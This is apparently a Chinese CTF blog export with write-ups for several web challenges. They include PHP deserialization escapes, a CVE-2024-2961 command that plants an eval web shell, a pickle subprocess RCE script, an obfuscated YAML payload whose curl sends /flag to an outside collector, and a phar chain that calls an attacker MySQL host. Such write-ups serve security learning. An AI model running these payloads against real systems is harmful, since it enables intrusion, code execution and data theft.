\"\\u006a\\u0069\\u006e\\u006a\\u0061\\u005f\\u0065\\u006e\\u0076\":{\n                    \"\\u0076\\u0061\\u0072\\u0069\\u0061\\u0062\\u006c\\u0065\\u005f\\u0073\\u0074\\u0061\\u0072\\u0074\\u005f\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067\":\"[#\",\n                    \"\\u0076\\u0061\\u0072\\u0069\\u0061\\u0062\\u006c\\u0065\\u005f\\u0065\\u006e\\u0064\\u005f\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067\":\"#]\"\n                }\n            }\n        }\n    }\n}\n```\n\n污染后还是之前一样的\n\n# Ezzz_php\n\n```php\n<?php \nhighlight_file(__FILE__);\nerror_reporting(0);\nfunction substrstr($data)\n{\n    $start = mb_strpos($data, \"[\");\n    $end = mb_strpos($data, \"]\");\n    return mb_substr($data, $start + 1, $end - 1 - $start);\n}\nclass read_file{\n    public $start;\n    public $filename=\"/etc/passwd\";\n    public function __construct($start){\n        $this->start=$start;\n    }\n    public function __destruct(){\n        if($this->start == \"gxngxngxn\"){\n           echo 'What you are reading is:'.file_get_contents($this->filename);\n        }\n    }\n}\nif(isset($_GET['start'])){\n    $readfile = new read_file($_GET['start']);\n    $read=isset($_GET['read'])?$_GET['read']:\"I_want_to_Read_flag\";\n    if(preg_match(\"/\\[|\\]/i\", $_GET['read'])){\n        die(\"NONONO!!!\");\n    }\n    $ctf = substrstr($read.\"[\".serialize($readfile).\"]\");\n    unserialize($ctf);\n}else{\n    echo \"Start_Funny_CTF!!!\";\n} Start_Funny_CTF!!!\n```\n\n审代码\n\n```php\nfunction substrstr($data)\n{\n    $start = mb_strpos($data, \"[\");\n    $end = mb_strpos($data, \"]\");\n    return mb_substr($data, $start + 1, $end - 1 - $start);\n}\n```\n\n分别找出`[`和`]`在字符串中的位置，并从字符串 `$data` 中提取出位于 `[` 和 `]` 之间的子字符串。\n\n```php\nclass read_file{\n    public $start;\n    public $filename=\"/etc/passwd\";\n    public function __construct($start){\n        $this->start=$start;\n    }\n    public function __destruct(){\n        if($this->start == \"gxngxngxn\"){\n           echo 'What you are reading is:'.file_get_contents($this->filename);\n        }\n    }\n}\n```\n\n一个读文件的类\n\n```php\nif(isset($_GET['start'])){\n    $readfile = new read_file($_GET['start']);\n    $read=isset($_GET['read'])?$_GET['read']:\"I_want_to_Read_flag\";\n    if(preg_match(\"/\\[|\\]/i\", $_GET['read'])){\n        die(\"NONONO!!!\");\n    }\n    $ctf = substrstr($read.\"[\".serialize($readfile).\"]\");\n    unserialize($ctf);\n}else{\n    echo \"Start_Funny_CTF!!!\";\n}\n```\n\n外层需要传入一个start，我们传入`?start=gxngxngxn`就可以拿到`/etc/passwd`的信息\n\n然后需要传入一个read，关键在于这个代码\n\n```php\n$ctf = substrstr($read.\"[\".serialize($readfile).\"]\");\n```\n\n这里的话因为substrstr函数中只会返回`[`和`]`之间的字符，所以得想办法逃逸字符\n\n本地一点点测试吧\n\n```php\n<?php\nclass read_file{\n    public $start=\"gxngxngxn\";\n    public $filename=\"/etc/passwd\";\n}\n$readfile = new read_file();\necho serialize($readfile).\"\\n\";\necho strlen(serialize($readfile));\n//O:9:\"read_file\":2:{s:5:\"start\";s:9:\"gxngxngxn\";s:8:\"filename\";s:11:\"/etc/passwd\";}\n//82\n```\n\n这是我们原始的字符串，长度为82\n\n然后我们本地搭一个环境\n\n![image-20250515111438382](../image/achieve/202411/西瓜杯/image-20250515111438382.png)\n\n![image-20250515111359534](../image/achieve/202411/西瓜杯/image-20250515111359534.png)\n\n可以看到传入一个%9f的时候，在substrstr函数判断的时候出现了错误，每传入一个%9f就会将字符串的结果往后推一个，%9f并没有被当成是正常的字符去处理，所以我们传入84个%9f试一下\n\n![image-20250515111615930](../image/achieve/202411/西瓜杯/image-20250515111615930.png)\n\n可以看到原先的序列化字符串被全部吞掉了，只剩下%9f了，那这时候我们传入一个序列化字符串呢的话就可以正常被反序列化\n\n注意在逃逸的时候需要添加一个%9f以此来抵消[]的影响，所以要比逃逸字符串数多个%9f\n\n生成逃逸的字符串exp\n\n```php\n<?php\nclass read_file{\n    public $start;\n    public $filename;\n}\n\n$a=new read_file();\n$a->start='gxngxngxn';\n$a->filename='/etc/hosts';\n\necho  str_repeat('%9f',strlen(serialize($a))+1).serialize($a);\n//%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9fO:9:\"read_file\":2:{s:5:\"start\";s:9:\"gxngxngxn\";s:8:\"filename\";s:10:\"/etc/hosts\";}\n```\n\n同时我们逃逸出的字符不能大于原来的字符数量，所以我们可以传参start来调整原字符的数量，以此逃逸出预期的字符\n\n```\n?start=gxngxng&read=%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9fO:9:\"read_file\":2:{s:5:\"start\";s:9:\"gxngxngxn\";s:8:\"filename\";s:10:\"/etc/hosts\";}\n```\n\n这里我去掉了start中两个字符，本地测试结果就很容易能看出来了\n\n![image-20250515112742772](../image/achieve/202411/西瓜杯/image-20250515112742772.png)\n\n然后页面成功触发任意文件读取，但是找不到flag\n\n任意文件读取变为RCE，参考**CVE-2024-2961**，但是需要改一下poc\n\n![image-20250515131146736](../image/achieve/202411/西瓜杯/image-20250515131146736.png)\n\n然后我们运行poc\n\n```\npython3 cnext-exploit.py http://a59136a6-1e10-42e8-b4d3-df12e510677c.challenge.ctf.show/ \"echo '<?php phpinfo();?>' > shell.php\"\n```\n\n![image-20250515131343470](../image/achieve/202411/西瓜杯/image-20250515131343470.png)\n\n访问shell.php发现文件存在且成功执行\n\n![image-20250515131443848](../image/achieve/202411/西瓜杯/image-20250515131443848.png)\n\n那我们写个马子进去\n\n```\npython3 cnext-exploit.py http://a59136a6-1e10-42e8-b4d3-df12e510677c.challenge.ctf.show/ \"echo '<?php @eval(\\$_POST['cmd']);?>' > shell2.php\"\n```\n\n注意这里需要对`$`进行转义\n\n![image-20250515131703254](../image/achieve/202411/西瓜杯/image-20250515131703254.png)\n","tags":["XGCTF"],"categories":["ctfshow"]},{"title":"DASCTF2024最后一战(已做完)","url":"/2025/05/14/DASCTF2024最后一战(已做完)/","content":"\n# const_python\n\n自认为搭建了一个完美的web应用，不会有问题，很自信地在src存放了源码，应该不会有人能拿到/flag的内容。\n\n访问/src拿到源码\n\n```python\nimport builtins\nimport io\nimport sys\nimport uuid\nfrom flask import Flask, request,jsonify,session\nimport pickle\nimport base64\n\n\napp = Flask(__name__)\n\napp.config['SECRET_KEY'] = str(uuid.uuid4()).replace(\"-\", \"\")\n\n\nclass User:\n    def __init__(self, username, password, auth='ctfer'):\n        self.username = username\n        self.password = password\n        self.auth = auth\n\npassword = str(uuid.uuid4()).replace(\"-\", \"\")\nAdmin = User('admin', password,\"admin\")\n\n@app.route('/')\ndef index():\n    return \"Welcome to my application\"\n\n\n@app.route('/login', methods=['GET', 'POST'])\ndef post_login():\n    if request.method == 'POST':\n\n        username = request.form['username']\n        password = request.form['password']\n\n\n        if username == 'admin' :\n            if password == admin.password:\n                session['username'] = \"admin\"\n                return \"Welcome Admin\"\n            else:\n                return \"Invalid Credentials\"\n        else:\n            session['username'] = username\n\n\n    return\n```\n\n源码中发现还有东西\n\n```python\n@app.route('/ppicklee', methods=['POST'])\ndef ppicklee():\n    data = request.form['data']\n\n    sys.modules['os'] = \"not allowed\"\n    sys.modules['sys'] = \"not allowed\"\n    try:\n\n        pickle_data = base64.b64decode(data)\n        for i in {\"os\", \"system\", \"eval\", 'setstate', \"globals\", 'exec', '__builtins__', 'template', 'render', '\\\\',\n                 'compile', 'requests', 'exit',  'pickle',\"class\",\"mro\",\"flask\",\"sys\",\"base\",\"init\",\"config\",\"session\"}:\n            if i.encode() in pickle_data:\n                return i+\" waf !!!!!!!\"\n\n        pickle.loads(pickle_data)\n        return \"success pickle\"\n    except Exception as e:\n        return \"fail pickle\"\n\n\n@app.route('/admin', methods=['POST'])\ndef admin():\n    username = session['username']\n    if username != \"admin\":\n        return jsonify({\"message\": 'You are not admin!'})\n    return \"Welcome Admin\"\n\n\n@app.route('/src')\ndef src():\n    return  open(\"app.py\", \"r\",encoding=\"utf-8\").read()\n\nif __name__ == '__main__':\n```\n\n一眼看出来是pickle反序列化进行rce，但是这里过滤了这么多\n\n```python\nfor i in {\"os\", \"system\", \"eval\", 'setstate', \"globals\", 'exec', '__builtins__', 'template', 'render', '\\\\',\n                 'compile', 'requests', 'exit',  'pickle',\"class\",\"mro\",\"flask\",\"sys\",\"base\",\"init\",\"config\",\"session\"}:\n            if i.encode() in pickle_data:\n                return i+\" waf !!!!!!!\"\n```\n\n这时候该如何绕过呢？\n\n看wp然后搜了一下subprocess模块，发现这是os.system的代替品，刚好也可以拿来绕过了\n\n![image-20250509110316798](../image/achieve/202411/DASCTF2024最后一战/image-20250509110316798.png)\n\n语法\n\n```\nsubprocess.run(args, *, stdin=None, input=None, stdout=None, stderr=None, capture_output=False, shell=False, cwd=None, timeout=None, check=False, encoding=None, errors=None, text=None, env=None, universal_newlines=None, **other_popen_kwargs)\n```\n\n那我们用reduce方法去打pickle反序列化，不过这里的话是无回显的，这里需要注意\n\n```python\nimport pickle\nimport subprocess\nimport base64\nimport requests\n\nurl = \"http://a7bad090-1104-44ff-8d73-26fec859fa88.node5.buuoj.cn:81/ppicklee\"\n\nclass Test:\n    def __reduce__(self):\n        # 使用 subprocess.run 执行 \"dir\" 命令\n        return (subprocess.run, ([\"bash\", \"-c\", \"ls / > app.py\"],), {\"shell\": True})\n\ntest = Test()\npickle_data = pickle.dumps(test)\n\npickle_data_base64 = base64.b64encode(pickle_data).decode('utf-8')\n\nprint(pickle_data)\nprint(pickle_data_base64)\n\ndata = {\n    \"data\" : pickle_data_base64,\n}\n\nr = requests.post(url, data=data)\nprint(r.text)\n\n```\n\n然后我们访问/src\n\n![image-20250509111701311](../image/achieve/202411/DASCTF2024最后一战/image-20250509111701311.png)\n\n然后cat一下flag就行\n\n# yaml_matser\n\n看一下附件\n\n```python\nimport os\nimport re\nimport yaml\nfrom flask import Flask, request, jsonify, render_template\n\n\napp = Flask(__name__, template_folder='templates')\n\nUPLOAD_FOLDER = 'uploads'\nos.makedirs(UPLOAD_FOLDER, exist_ok=True)\ndef waf(input_str):\n\n\n    blacklist_terms = {'apply', 'subprocess','os','map', 'system', 'popen', 'eval', 'sleep', 'setstate',\n                       'command','static','templates','session','&','globals','builtins'\n                       'run', 'ntimeit', 'bash', 'zsh', 'sh', 'curl', 'nc', 'env', 'before_request', 'after_request',\n                       'error_handler', 'add_url_rule','teardown_request','teardown_appcontext','\\\\u','\\\\x','+','base64','join'}\n\n    input_str_lower = str(input_str).lower()\n\n\n    for term in blacklist_terms:\n        if term in input_str_lower:\n            print(f\"Found blacklisted term: {term}\")\n            return True\n    return False\n\n\n\nfile_pattern = re.compile(r'.*\\.yaml$')\n\n\ndef is_yaml_file(filename):\n    return bool(file_pattern.match(filename))\n\n@app.route('/')\ndef index():\n    return '''\n    Welcome to DASCTF X 0psu3\n    <br>\n    Here is the challenge <a href=\"/upload\">Upload file</a>\n    <br>\n    Enjoy it <a href=\"/Yam1\">Yam1</a>\n    '''\n\n@app.route('/upload', methods=['GET', 'POST'])\ndef upload_file():\n    if request.method == 'POST':\n        try:\n            uploaded_file = request.files['file']\n\n            if uploaded_file and is_yaml_file(uploaded_file.filename):\n                file_path = os.path.join(UPLOAD_FOLDER, uploaded_file.filename)\n                uploaded_file.save(file_path)\n\n                return jsonify({\"message\": \"uploaded successfully\"}), 200\n            else:\n                return jsonify({\"error\": \"Just YAML file\"}), 400\n\n        except Exception as e:\n            return jsonify({\"error\": str(e)}), 500\n\n\n    return render_template('upload.html')\n\n@app.route('/Yam1', methods=['GET', 'POST'])\ndef Yam1():\n    filename = request.args.get('filename','')\n    if filename:\n        with open(f'uploads/{filename}.yaml', 'rb') as f:\n            file_content = f.read()\n        if not waf(file_content):\n            test = yaml.load(file_content)\n            print(test)\n    return 'welcome'\n\n\nif __name__ == '__main__':\n    app.run()\n\n\n\n```\n\n先理解一下源码，其实就是需要我们上传一个yaml文件去执行RCE，先看看过滤了什么\n\n```python\ndef waf(input_str):\n\n\n    blacklist_terms = {'apply', 'subprocess','os','map', 'system', 'popen', 'eval', 'sleep', 'setstate',\n                       'command','static','templates','session','&','globals','builtins'\n                       'run', 'ntimeit', 'bash', 'zsh', 'sh', 'curl', 'nc', 'env', 'before_request', 'after_request',\n                       'error_handler', 'add_url_rule','teardown_request','teardown_appcontext','\\\\u','\\\\x','+','base64','join'}\n\n    input_str_lower = str(input_str).lower()\n\n\n    for term in blacklist_terms:\n        if term in input_str_lower:\n            print(f\"Found blacklisted term: {term}\")\n            return True\n    return False\n```\n\n其实过滤的还是蛮多的，很多命令执行函数都被过滤掉了\n\n之前我没有接触过yaml反序列化，做之前还得去学一下，后面发现好像跟pickle没啥太大的区别\n\n这里绕过的话直接用编码去绕过\n\n需要上传一个yml文件，然后通过Yam1函数中的load去实现反序列化进行rce，直接写脚本一把梭\n\n注意这里是无回显的，还得打curl外带或者反弹shell\n\n```python\nimport requests\n\nexp = '__import__(\"os\").system(\"curl -d @/flag havtes3pel3xmey9c56cvzw1isojcc01.oastify.com\")'\n\n#print(f\"exec(bytes([[j][0]for(i)in[range({len(exp)})][0]for(j)in[range(256)][0]if[\"+\"]]or[\".join([f\"i]in[[{i}]]and[j]in[[{ord(j)}\" for i, j in enumerate(exp)]) + \"]]]))\")\n\npayload = b\"\"\"\n!!python/object/new:type\nargs:\n  - exp\n  - !!python/tuple []\n  - {\"extend\": !!python/name:exec }\nlistitems: \\\"exec(bytes([[j][0]for(i)in[range(86)][0]for(j)in[range(256)][0]if[i]in[[0]]and[j]in[[95]]or[i]in[[1]]and[j]in[[95]]or[i]in[[2]]and[j]in[[105]]or[i]in[[3]]and[j]in[[109]]or[i]in[[4]]and[j]in[[112]]or[i]in[[5]]and[j]in[[111]]or[i]in[[6]]and[j]in[[114]]or[i]in[[7]]and[j]in[[116]]or[i]in[[8]]and[j]in[[95]]or[i]in[[9]]and[j]in[[95]]or[i]in[[10]]and[j]in[[40]]or[i]in[[11]]and[j]in[[34]]or[i]in[[12]]and[j]in[[111]]or[i]in[[13]]and[j]in[[115]]or[i]in[[14]]and[j]in[[34]]or[i]in[[15]]and[j]in[[41]]or[i]in[[16]]and[j]in[[46]]or[i]in[[17]]and[j]in[[115]]or[i]in[[18]]and[j]in[[121]]or[i]in[[19]]and[j]in[[115]]or[i]in[[20]]and[j]in[[116]]or[i]in[[21]]and[j]in[[101]]or[i]in[[22]]and[j]in[[109]]or[i]in[[23]]and[j]in[[40]]or[i]in[[24]]and[j]in[[34]]or[i]in[[25]]and[j]in[[99]]or[i]in[[26]]and[j]in[[117]]or[i]in[[27]]and[j]in[[114]]or[i]in[[28]]and[j]in[[108]]or[i]in[[29]]and[j]in[[32]]or[i]in[[30]]and[j]in[[45]]or[i]in[[31]]and[j]in[[100]]or[i]in[[32]]and[j]in[[32]]or[i]in[[33]]and[j]in[[64]]or[i]in[[34]]and[j]in[[47]]or[i]in[[35]]and[j]in[[102]]or[i]in[[36]]and[j]in[[108]]or[i]in[[37]]and[j]in[[97]]or[i]in[[38]]and[j]in[[103]]or[i]in[[39]]and[j]in[[32]]or[i]in[[40]]and[j]in[[104]]or[i]in[[41]]and[j]in[[97]]or[i]in[[42]]and[j]in[[118]]or[i]in[[43]]and[j]in[[116]]or[i]in[[44]]and[j]in[[101]]or[i]in[[45]]and[j]in[[115]]or[i]in[[46]]and[j]in[[51]]or[i]in[[47]]and[j]in[[112]]or[i]in[[48]]and[j]in[[101]]or[i]in[[49]]and[j]in[[108]]or[i]in[[50]]and[j]in[[51]]or[i]in[[51]]and[j]in[[120]]or[i]in[[52]]and[j]in[[109]]or[i]in[[53]]and[j]in[[101]]or[i]in[[54]]and[j]in[[121]]or[i]in[[55]]and[j]in[[57]]or[i]in[[56]]and[j]in[[99]]or[i]in[[57]]and[j]in[[53]]or[i]in[[58]]and[j]in[[54]]or[i]in[[59]]and[j]in[[99]]or[i]in[[60]]and[j]in[[118]]or[i]in[[61]]and[j]in[[122]]or[i]in[[62]]and[j]in[[119]]or[i]in[[63]]and[j]in[[49]]or[i]in[[64]]and[j]in[[105]]or[i]in[[65]]and[j]in[[115]]or[i]in[[66]]and[j]in[[111]]or[i]in[[67]]and[j]in[[106]]or[i]in[[68]]and[j]in[[99]]or[i]in[[69]]and[j]in[[99]]or[i]in[[70]]and[j]in[[48]]or[i]in[[71]]and[j]in[[49]]or[i]in[[72]]and[j]in[[46]]or[i]in[[73]]and[j]in[[111]]or[i]in[[74]]and[j]in[[97]]or[i]in[[75]]and[j]in[[115]]or[i]in[[76]]and[j]in[[116]]or[i]in[[77]]and[j]in[[105]]or[i]in[[78]]and[j]in[[102]]or[i]in[[79]]and[j]in[[121]]or[i]in[[80]]and[j]in[[46]]or[i]in[[81]]and[j]in[[99]]or[i]in[[82]]and[j]in[[111]]or[i]in[[83]]and[j]in[[109]]or[i]in[[84]]and[j]in[[34]]or[i]in[[85]]and[j]in[[41]]]))\\\"\"\"\"\nurl = \"http://node5.buuoj.cn:26378/\"\n\nr1=requests.post(url + \"/upload\", files={'file': ('poc1.yaml', payload, 'application/octet-stream')})\nprint(r1.text)\n\nr2 = requests.get(url + \"/Yam1?filename=poc1\")\nprint(r2.text)\n```\n\n\n\n# strange_php\n\n附件有很多东西，可以放seay里面去审计一下\n\n![image-20250512160903549](../image/achieve/202411/DASCTF2024最后一战/image-20250512160903549.png)\n\n然后我们看一下源码\n\n在登录和注册页面的源码中对sql语句都是进行了一个预处理操作，估计sql打不通，我们注册登录进去看看\n\nwelcome.php的源码\n\n```php\n//welcome.php\n<?php\nheader('Content-Type: text/html; charset=utf-8');\nsession_start();\nrequire_once 'PDO_connect.php';\nrequire_once 'User.php';\nrequire_once  'UserMessage.php';\n\nif (!isset($_SESSION['user_id'])) {\n   header(\"Location: index.html\");\n   exit;\n}\n$Message = new UserMessage();\n\n\n$userMessage = new UserMessage();\n$database = new PDO_connect();\n$database->init();\n$db = $database->get_connection();\n\n\nif (isset($_POST['action'])) {\n    $action = $_POST['action'];\n    echo $action;\n    switch ($action) {\n        case 'message':\n            echo \"write messageing\";\n            $decodedMessage = base64_decode($_POST['encodedMessage']);\n            \n            $msg = $userMessage->writeMessage($decodedMessage);\n            if($msg===false){\n                echo \"写入失败\";\n                break;\n            }\n            $filePath = $userMessage->get_filePath();\n            $_SESSION['message_path'] = $filePath;\n            echo \"留言已写入: \". $userMessage->get_filePath();\n            break;\n            case 'editMessage':\n                $decodedEditMessage = base64_decode($_POST['encodedEditMessage']);\n                if(!isset($_SESSION['message_path'])){\n                    break;\n                }\n                $msg = $userMessage->editMessage($_SESSION['message_path'],$decodedEditMessage);\n                if($msg){\n                    echo \"留言已成功更改\";\n                }\n                else{\n                    echo \"操作失败，请重新尝试\";\n                }\n                break;\n        case 'delete':\n            $message = $_POST['message_path']?$_POST['message_path']:$_SESSION['message_path'];\n            $msg = $userMessage->deleteMessage($message);\n            if($msg){\n                echo \"留言已成功删除\";\n            }\n            else{\n                echo \"操作失败，请重新尝试\";\n            }\n            break;\n            case 'clean':\n                exec('rm log/*');\n                exec('rm txt/*');\n    }\n\n\n}\n\n\n\n\n?>\n```\n\n找找可控的参数吧\n\n先看写留言部分\n\n![image-20250512162913526](../image/achieve/202411/DASCTF2024最后一战/image-20250512162913526.png)\n\n这里的话有一个writeMessage方法，并且$decodedMessage可控，我们跟进这个方法看一下\n\n```php\n//方法writeMessage\npublic function writeMessage($message) {\n\n\n    // 写入留言到文件中\n    $a= file_put_contents($this->filePath, $message);\n    if ($a === false) {\n        return false;\n    }\n    return true;\n}\n\t|\n\t|\n//参数filePath\npublic function __construct() {\n        $this->filePath = $this->generateFileName();\n    }\n\t|\n    |\n//方法generateFileName\npublic function generateFileName() {\n        $timestamp = microtime(true);\n        $hash = md5($timestamp);\n        $fileName = \"./txt/\".$hash . \".txt\";\n        return $fileName;\n    }\n```\n\n这里的话文件路径是不可控的，但是这个文件内容最终是会被base64解码的，但生成的文件是txt文件，打xss貌似行不通\n\n编辑留言部分也一样没得可用的点，然后看删除留言部分\n\n![image-20250512163914740](../image/achieve/202411/DASCTF2024最后一战/image-20250512163914740.png)\n\n这个message_path是可控的，我们跟进deleteMessage方法看一下\n\n```php\n//deleteMessage\npublic function deleteMessage($path) {\n    $path = $path.\".txt\";\n    // 删除留言文件\n    if (file_exists($path)) {\n        $msg = unlink($path);\n        if ($msg === false) {\n            return false;\n        }\n        return true;\n    }\n    return false;\n}\n```\n\nunlink函数，估计是可以打phar反序列化的，并且message_path可控吗，那该怎么打呢？找找危险函数\n\n```php\n//__set()方法\npublic function __set($name, $value)\n{\n    $this->$name = $value;\n       $a =  file_get_contents($this->filePath).\"</br>\";\n    file_put_contents(\"/var/www/html/log/\".md5($this->filePath).\".txt\", $a);\n\n}\n```\n\n这里的话有一个file_get_contents函数，看看能不能实现任意文件读取，但这里的前提是filePath可控\n\n怎么触发`__set()`呢？\n\n将数据写入不可访问或者不存在的属性，即设置一个类的成员变量，也就是说赋值时触发这个魔术方法\n\n但是如果是在UserMessage类的话显然不可能，我们看PDO_connect类\n\n![image-20250512164855768](../image/achieve/202411/DASCTF2024最后一战/image-20250512164855768.png)\n\n到这里我就没找到触发的方法，然后看大佬的wp写的是\n\nhttps://www.cnblogs.com/gxngxngxn/p/18620905\n\n![image-20250512165457708](../image/achieve/202411/DASCTF2024最后一战/image-20250512165457708.png)\n\n一开始没看明白，后面问了师傅才问明白\n\n`PDO::ATTR_DEFAULT_FETCH_MODE=262152`的作用是把sql查询的结果封装成一个对象，而且sql注入第一列的结果是对象的名字\n\n然后入口是在`User.php::log()`，这里可以调用到pdo中的get_connection，这里就是我们链子的入口\n\n![image-20250512203418748](../image/achieve/202411/DASCTF2024最后一战/image-20250512203418748.png)\n\n但是这里没有文件上传的点，所以关键点在于我们写留言的地方，我们需要将phar文件的内容编码然后传入，去生成txt文件\n\n然后我们写链子\n\n```php\n<?php\n\nclass User{\n    private $conn;\n    private $table = 'users';\n\n    public $id;\n    public $username=\"UserMessage\";\n    private $password=\"aaaa\";\n    public $created_at;\n\n    public function __construct() {\n        $this->conn = new PDO_connect();\n    }\n}\nclass PDO_connect{\n    private $pdo;\n    public $con_options = array(\n        \"dsn\"=>\"mysql:host=124.223.25.186:3306;dbname=users;charset=utf8\",\n        'host'=>'124.223.25.186',\n        'port'=>'3306',\n        'user'=>'joker',\n        'password'=>'joker',\n        'charset'=>'utf8',\n        'options'=>array(PDO::ATTR_DEFAULT_FETCH_MODE=>262152,\n            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION)\n    );\n    public $smt;\n\n}\n\n$a = new User();\n$phar = new phar('test.phar');//后缀名必须为phar0\n$phar->startBuffering();\n$phar->setStub(\"<?php __HALT_COMPILER();?>\");//设置stub\n$phar->setMetadata($a);//自定义的meta-data存入manifest\n$phar->addFromString(\"flag.txt\",\"flag\");//添加要压缩的文件\n//签名自动计算\n$phar->stopBuffering();\n\n$file = file_get_contents('test.phar');\n\necho urlencode(base64_encode($file));\n?>\n//PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8%2BDQokAgAAAQAAABEAAAABAAAAAADuAQAATzo0OiJVc2VyIjo2OntzOjEwOiIAVXNlcgBjb25uIjtPOjExOiJQRE9fY29ubmVjdCI6Mzp7czoxNjoiAFBET19jb25uZWN0AHBkbyI7TjtzOjExOiJjb25fb3B0aW9ucyI7YTo3OntzOjM6ImRzbiI7czo1NjoibXlzcWw6aG9zdD0xMjQuMjIzLjI1LjE4NjozMzA2O2RibmFtZT11c2VycztjaGFyc2V0PXV0ZjgiO3M6NDoiaG9zdCI7czoxNDoiMTI0LjIyMy4yNS4xODYiO3M6NDoicG9ydCI7czo0OiIzMzA2IjtzOjQ6InVzZXIiO3M6NToiam9rZXIiO3M6ODoicGFzc3dvcmQiO3M6NToiam9rZXIiO3M6NzoiY2hhcnNldCI7czo0OiJ1dGY4IjtzOjc6Im9wdGlvbnMiO2E6Mjp7aToxOTtpOjI2MjE1MjtpOjM7aToyO319czozOiJzbXQiO047fXM6MTE6IgBVc2VyAHRhYmxlIjtzOjU6InVzZXJzIjtzOjI6ImlkIjtOO3M6ODoidXNlcm5hbWUiO3M6MTE6IlVzZXJNZXNzYWdlIjtzOjE0OiIAVXNlcgBwYXNzd29yZCI7czo0OiJhYWFhIjtzOjEwOiJjcmVhdGVkX2F0IjtOO30IAAAAZmxhZy50eHQEAAAAGOwhaAQAAACa6%2FTRtgEAAAAAAABmbGFnbGdaQpI%2Bq5h6NLLztLlFIp8ZeRgCAAAAR0JNQg%3D%3D\n```\n\n![image-20250512204115338](../image/achieve/202411/DASCTF2024最后一战/image-20250512204115338.png)\n\n然后我们需要在我们的vps中新建用户joker，并且创建一个users数据库，并需要设置一个filePath列\n\nmysql命令行新建用户\n\n```\nCREATE USER 'joker'@'%' IDENTIFIED BY 'joker';\nGRANT ALL PRIVILEGES ON users.* TO 'joker'@'%';\nFLUSH PRIVILEGES;\n```\n\n然后我们用phpmyadmin可视化控制数据库，这样更好操作\n\n![image-20250512202530607](../image/achieve/202411/DASCTF2024最后一战/image-20250512202530607.png)\n\n因为在我们的payload中如果出现phar反序列化的话，会尝试连接我们的数据库，那么就会通过我们设置的filePath去进行任意文件读取\n\n![image-20250512203242815](../image/achieve/202411/DASCTF2024最后一战/image-20250512203242815.png)\n\n然后删除后触发phar，访问log/0bc7be346d4df269543565b6b7cd231a.txt拿到flag\n\n# 西湖论剑邀请函获取器\n\n其实能测出来是ssti，但是并不知道是什么框架的，一直以为是flask框架的，测了好久\n\n![image-20250513082511176](../image/achieve/202411/DASCTF2024最后一战/image-20250513082511176.png)\n\n这里可以看到是存在ssti的，但是并不是我学过的twig，flask的\n\n![image-20250513082609715](../image/achieve/202411/DASCTF2024最后一战/image-20250513082609715.png)\n\n以为是过滤了，但是一直没绕过去，看了提示知道是RUST的\n\n![image-20250513082707839](../image/achieve/202411/DASCTF2024最后一战/image-20250513082707839.png)\n\n然后rust下tera框架的注入，但是只写了如何读取环境变量\n\npayload\n\n```\n{{ get_env(name=\"FLAG\") }}\n```\n\n","tags":["DASCTF2024"],"categories":["赛题wp"]},{"title":"SSTI的积累","url":"/2025/04/30/SSTI的积累/","content":"\n# 前置知识\n\n## 模板引擎\n\n首先我们先讲解下什么是模板引擎，为什么需要模板\n\n模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，它可以生成特定格式的文档，利用模板引擎来生成前端的 HTML 代码，模板引擎会提供一套生成 HTML 代码的程序，然后只需要获取用户的数据，再放到渲染函数里，接着生成模板 + 用户数据的前端 HTML 页面，最后反馈给浏览器，呈现在用户面前。\n\n模板只是一种提供给程序解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。\n\n在后端渲染里，浏览器会接收到经过服务器计算的之后呈现给用户的HTML代码，此时计算就是服务器后端经过解析服务器端的模板来完成的。\n\n在前端渲染里，是浏览器从服务器拿到信息，再由浏览器前端来解析渲染这段信息变成用户可视化的HTML代码并呈现在用户面前。\n\n举个简单的例子\n\n```html\n<html>\n<div>{$name}</div>\n</html>\n```\n\n这里我们希望呈现给用户的是用户自己的名字，但我们并不知道用户的名字是什么，这时候可以用一些用户的信息经过渲染到这个name变量里面，然后呈现给用户\n\n```html\n<html>\n<div>wanth3f1ag</div>\n</html>\n```\n\n当然这只是最简单的示例，一般来说，至少会提供分支，迭代。还有一些内置函数。\n\n那什么是服务端模板注入呢\n\n## 什么是ssti\n\nSSTI 就是服务器端模板注入（Server-Side Template Injection）\n\n当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。\n\n漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。\n\n凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。\n\n![img](../image/achieve/202411/ssti/1344396-20200911174631687-758048107.png)\n\n# Flask下的Jinja2模板注入\n\n## 什么是Flask？\n\nFlask 是一个轻量级的 **Python Web 框架**，用于快速构建 Web 应用程序和 